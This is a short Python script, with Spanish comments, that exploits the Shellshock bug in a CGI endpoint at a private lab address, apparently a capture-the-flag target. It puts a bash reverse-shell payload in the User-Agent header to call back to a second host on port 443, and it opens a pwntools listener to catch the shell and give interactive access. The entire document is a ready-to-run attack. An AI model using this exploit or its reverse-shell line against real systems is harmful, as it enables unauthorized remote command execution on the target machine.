#!/usr/bin/python3

from pwn import *
import requests, signal, sys, pdb, threading, time

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://192.168.111.42/cgi-bin/underworld"
lport = 443

def shellshock():

    headers = {
        'User-Agent': "() { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.111.106/443 0>&1"
    }

    r = requests.get(main_url, headers=headers)

if __name__ == '__main__':

    try:
        threading.Thread(target=shellshock, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
